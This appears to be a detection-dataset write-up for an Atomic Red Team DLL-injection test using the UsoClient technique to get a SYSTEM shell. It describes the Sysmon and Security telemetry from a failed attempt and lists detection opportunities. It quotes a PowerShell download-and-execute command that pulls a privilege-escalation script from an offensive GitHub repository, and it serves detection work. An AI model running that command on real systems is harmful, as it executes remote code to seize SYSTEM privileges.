# T1055.001-2: Dynamic-link Library Injection — WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique

## Technique Context

T1055.001 Dynamic-link Library Injection is a process injection technique where attackers insert code into running processes by forcing them to load malicious or hijacked DLLs. This technique enables privilege escalation, defense evasion, and persistence by executing code within the context of legitimate processes. The detection community typically focuses on monitoring process access events with high privileges (especially PROCESS_ALL_ACCESS), unusual DLL loading patterns, and cross-process injection behaviors. This specific test attempts to leverage the Windows Update Client (UsoClient) DLL loading mechanism to achieve SYSTEM privileges, representing a real-world privilege escalation technique documented in the S3cur3Th1sSh1t Get-System-Techniques repository.

## What This Dataset Contains

This dataset captures a failed DLL injection attempt using a PowerShell-based UsoClient technique. The Security channel shows process creation for `powershell.exe` with command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')}` (Process ID 17628), indicating an attempt to download and execute a remote PowerShell script. The parent PowerShell process (Process ID 35852) executes `whoami.exe` for system enumeration. 

Sysmon captures rich process injection telemetry through Event ID 10 (ProcessAccess), showing the source PowerShell process (35852) accessing both the `whoami.exe` process (36428) and the child PowerShell process (17628) with `GrantedAccess: 0x1FFFFF` (PROCESS_ALL_ACCESS). The CallTrace shows the injection path through .NET assemblies including `System.Management.Automation.ni.dll`, indicating PowerShell's native process manipulation capabilities.

Multiple Sysmon Event ID 7 (ImageLoad) events show .NET runtime DLLs loading into PowerShell processes (`mscoree.dll`, `mscoreei.dll`, `clr.dll`), along with Windows Defender components (`MpOAV.dll`, `MpClient.dll`). The child PowerShell process (17628) exits with status code 0x1, suggesting the injection attempt failed.

## What This Dataset Does Not Contain

The dataset lacks evidence of successful DLL injection. There are no Sysmon Event ID 8 (CreateRemoteThread) events showing thread creation in target processes, nor Event ID 25 (ProcessTampering) events indicating process modification. The remote PowerShell script download appears to have failed (exit code 0x1), so we don't see the actual UsoClient.exe process creation or DLL hijacking that would characterize successful exploitation of this technique. Windows Defender's real-time protection likely blocked the remote script download, preventing the technique from proceeding beyond initial enumeration. Network connection events are also absent, confirming the download failure.

## Assessment

This dataset provides excellent telemetry for detecting attempted but unsuccessful DLL injection through PowerShell. The combination of Security 4688 events with full command-line logging and Sysmon ProcessAccess events creates a strong detection foundation. The process access patterns with PROCESS_ALL_ACCESS rights from PowerShell to spawned processes, combined with .NET call traces, clearly indicate injection attempts. However, the technique's failure limits the dataset's value for understanding successful UsoClient DLL hijacking. The telemetry would be stronger with successful execution showing UsoClient.exe creation, malicious DLL loading, and the resulting privilege escalation.

## Detection Opportunities Present in This Data

1. **PowerShell Remote Script Download**: Security Event ID 4688 showing `powershell.exe` with `iex(new-object net.webclient).downloadstring` pattern for remote code execution attempts

2. **Process Injection via PowerShell**: Sysmon Event ID 10 showing PowerShell processes accessing other processes with PROCESS_ALL_ACCESS (0x1FFFFF) rights

3. **Cross-Process Access from PowerShell**: ProcessAccess events where SourceImage is PowerShell and TargetImage differs, especially with high-privilege access rights

4. **PowerShell Process Chain Analysis**: Security 4688 events showing PowerShell spawning child PowerShell processes with suspicious command lines

5. **System Discovery After Injection Attempt**: Sysmon Event ID 1 showing `whoami.exe` execution immediately following process access events, indicating post-exploitation enumeration

6. **CallTrace-Based Detection**: Sysmon ProcessAccess events with CallTrace containing `System.Management.Automation` assemblies targeting non-PowerShell processes

7. **GitHub Raw Content Access**: Command-line patterns showing PowerShell downloading scripts from raw.githubusercontent.com, particularly from offensive security repositories

8. **Failed Injection Process Exit Codes**: Security Event ID 4689 showing PowerShell processes exiting with non-zero status codes after process access attempts
